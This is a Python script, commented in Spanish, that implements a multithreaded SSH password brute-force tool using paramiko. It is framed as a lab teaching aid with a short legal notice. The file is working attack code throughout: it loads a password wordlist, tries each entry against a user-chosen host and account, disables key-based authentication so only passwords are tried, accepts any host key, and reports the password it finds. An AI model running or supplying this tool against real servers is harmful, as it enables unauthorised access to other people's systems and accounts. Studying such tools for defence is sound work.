"""
Herramienta de Fuerza Bruta SSH (Entorno de Laboratorio)

Explicacion humana:
    SSH es el protocolo que usamos para conectarnos a servidores remotos
    de forma segura (como cuando haces "ssh usuario@servidor").
    Esta herramienta prueba muchas contrasenas de un diccionario contra
    un servidor SSH para ver si alguna funciona.

    Esto es lo que hacen los atacantes reales cuando encuentran un servidor
    SSH expuesto a internet. Por eso es TAN importante usar contrasenas
    largas o, mejor aun, autenticacion por clave publica.

Aviso legal:
    Solo para uso en laboratorios propios o con autorizacion explicita.
"""

import socket
import threading
import time
import sys
from queue import Queue

# Intentamos importar paramiko (la libreria de SSH para Python)
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

print_lock = threading.Lock()


def ssh_connect(host, port, username, password, timeout=5):
    """
    Intenta conectarse por SSH con las credenciales dadas.

    Retorna True si la contrasena es correcta, False si no.
    Es como probar llaves en una cerradura: una por una hasta
    que alguna encaje.
    """
    if not PARAMIKO_AVAILABLE:
        # Si no tenemos paramiko, simulamos la conexion
        # En un entorno real, necesitarias: pip install paramiko
        return False

    client = paramiko.SSHClient()
    # AutoAddPolicy = Aceptar la clave del servidor sin preguntar
    # En produccion NO hagas esto, pero para un lab esta bien
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            # Desactivamos la autenticacion por clave para forzar password
            look_for_keys=False,
            allow_agent=False
        )
        # Si llegamos aqui sin excepcion, la contrasena es correcta
        client.close()
        return True

    except paramiko.AuthenticationException:
        # Contrasena incorrecta, seguimos probando
        return False
    except (paramiko.SSHException, socket.error, socket.timeout):
        # Error de conexion (servidor caido, timeout, etc.)
        return False
    except Exception:
        return False


def worker(host, port, username, queue, results):
    """
    Hilo trabajador: saca contrasenas de la cola y las prueba.

    Cada hilo es como un ayudante que coge una llave del monton,
    la prueba en la cerradura, y si no funciona coge la siguiente.
    """
    while not queue.empty():
        password = queue.get()

        with print_lock:
            print(f"  [*] Probando: {username}:{password}", end='\r')

        if ssh_connect(host, port, username, password):
            with print_lock:
                print(f"\n  [+] ENCONTRADA! {username}:{password}")
            results.append(password)
            # Vaciamos la cola para que los demas hilos paren
            while not queue.empty():
                try:
                    queue.get_nowait()
                except Exception:
                    break

        queue.task_done()


def run_ssh_bruteforce(host, port, username, wordlist_path, threads=4):
    """
    Funcion principal que lanza el ataque de fuerza bruta.
    """
    print("-" * 50)
    print(f"  Objetivo: {host}:{port}")
    print(f"  Usuario: {username}")
    print(f"  Diccionario: {wordlist_path}")
    print(f"  Hilos: {threads}")
    print("-" * 50)

    # Cargamos las contrasenas del diccionario en una cola
    queue = Queue()
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if word:
                    queue.put(word)
    except FileNotFoundError:
        print(f"  [ERROR] No se encontro el archivo: {wordlist_path}")
        return None

    total = queue.qsize()
    print(f"  [*] Cargadas {total} contrasenas. Iniciando...")

    results = []
    start_time = time.time()

    # Lanzamos los hilos
    thread_list = []
    for _ in range(min(threads, total)):
        t = threading.Thread(
            target=worker,
            args=(host, port, username, queue, results)
        )
        t.daemon = True
        t.start()
        thread_list.append(t)

    # Esperamos a que terminen
    queue.join()

    elapsed = round(time.time() - start_time, 2)
    print(f"\n  [*] Finalizado en {elapsed} segundos.")

    if results:
        print(f"  [+] Contrasena encontrada: {results[0]}")
        return results[0]
    else:
        print("  [-] No se encontro la contrasena en el diccionario.")
        return None


if __name__ == "__main__":
    print("\n=== SSH Bruteforce Tool (Solo para laboratorio) ===\n")

    host = input("  IP del servidor SSH: ").strip()
    port_str = input("  Puerto [22]: ").strip()
    port = int(port_str) if port_str else 22
    username = input("  Usuario objetivo: ").strip()
    wordlist = input("  Ruta al diccionario: ").strip()
    threads_str = input("  Hilos [4]: ").strip()
    threads = int(threads_str) if threads_str else 4

    run_ssh_bruteforce(host, port, username, wordlist, threads)
